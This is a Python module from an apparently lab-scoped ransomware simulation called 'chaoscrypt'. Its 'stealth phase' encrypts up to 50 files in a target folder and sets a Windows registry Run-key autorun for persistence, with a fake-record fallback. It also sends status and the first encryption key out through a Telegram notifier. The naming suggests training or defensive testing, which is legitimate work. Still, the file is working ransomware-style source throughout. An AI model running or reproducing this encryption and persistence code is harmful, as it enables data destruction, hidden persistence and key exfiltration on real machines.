import os
import sys
import time

from chaoscrypt.settings import STEALTH_TARGET_DIR, LOG_DIR
from chaoscrypt.encryptor import StreamingEncryptor
from chaoscrypt.logbook import LogBook

try:
    from chaoscrypt.telegram_notify import send_message
except ImportError:
    send_message = None

ENCRYPT_LIMIT = 50
try:
    import winreg
    HAS_WINREG = True
except ImportError:
    HAS_WINREG = False

def wow_stealth_effects(logger, key):
    reg_key_name = "ChaosStealthLab"
    reg_key_value = f"StealthDemo_{key[:8]}"
    autorun_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    fallback_reason = ""
    did_registry = False
    if HAS_WINREG:
        try:
            reg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
            with winreg.OpenKey(reg, autorun_path, 0, winreg.KEY_SET_VALUE) as key_handle:
                winreg.SetValueEx(key_handle, reg_key_name, 0, winreg.REG_SZ, reg_key_value)
                logger.log_event("infection", f"Set autorun in registry: {autorun_path}\\{reg_key_name}",
                                 metadata={"value": reg_key_value, "autorun_path": autorun_path})
                did_registry = True
                if send_message:
                    send_message(f"🔵 Registry autorun set: {reg_key_name} → {reg_key_value}", async_mode=True)
        except Exception as e:
            fallback_reason = f"Registry autorun ERROR: {e}"
    else:
        fallback_reason = "winreg not present: autorun not set (non-Windows/missing module)"

    if not did_registry:
        try:
            fake_reg_path = os.path.join(LOG_DIR, f"stealth_persistence_{int(time.time())}.txt")
            with open(fake_reg_path, "w", encoding="utf-8") as f:
                f.write(f"FAKE REGISTRY PERSISTENCE: KeyName={reg_key_name}, Value={reg_key_value}\n")
                if fallback_reason:
                    f.write(f"Fallback reason: {fallback_reason}\n")
            logger.log_event("infection", f"FAKE autorun record written (fallback) at {fake_reg_path}",
                             metadata={"key": key, "fallback": fallback_reason})
            if send_message:
                send_message(
                    f"⚠️ Registry autorun not possible, fallback (audit-trace file): {os.path.basename(fake_reg_path)}",
                    async_mode=True
                )
        except Exception as e2:
            logger.log_event("infection", f"FAKE autorun Fallback ERROR: {e2}", tag="error")
            if send_message:
                send_message(f"❗️ Stealth phase: Fallback persistence failed: {e2}", async_mode=True)

def run_stealth_case():
    os.makedirs(STEALTH_TARGET_DIR, exist_ok=True)
    logger = LogBook(phase="stealth")
    logger.log_event("info", "Stealth phase started")
    if send_message:
        send_message("🔵 Stealth phase started", async_mode=True)

    encryptor = StreamingEncryptor(phase="stealth")
    results = []
    count = 0
    try:
        abs_folder = os.path.abspath(STEALTH_TARGET_DIR)
        for root, dirs, files in os.walk(abs_folder):
            for fname in files:
                if fname.endswith(".cclab"):
                    continue
                file_path = os.path.join(root, fname)
                result = encryptor.encrypt_file(file_path)
                if result:
                    results.append(result)
                    count += 1
                    if count >= ENCRYPT_LIMIT:
                        logger.log_event("info", f"Stealth encrypt limit ({ENCRYPT_LIMIT}) reached!", tag="limit")
                        break
            if count >= ENCRYPT_LIMIT:
                break
    except Exception as e:
        logger.log_event("encryption", f"ENCRYPT ERROR: {e}", tag="error")
    nenc = len(results)
    keys = [k for _, k in results]
    log_meta = {"keys_count": len(keys), "preview_keys": keys[:3]}
    logger.log_event(
        "encryption", f"Encrypted {nenc} files in Target_Stealth",
        metadata=log_meta
    )
    logger.fp_jsonl.flush()
    if nenc > 0:
        key = keys[0]
        wow_stealth_effects(logger, key)
        logger.log_event("info", f"Stealth phase key (first):", metadata={"key": key})
        if send_message:
            send_message(f"🔵 Stealth phase complete! {nenc} files encrypted. Key: {key}", async_mode=True)
    else:
        logger.log_event("info", "No files encrypted in Target_Stealth, skipping effects/notify.")

    logger.log_event("recommendation", "Proceed to next phase: analyze / antidote.")
    logger.close()

if __name__ == "__main__":
    run_stealth_case()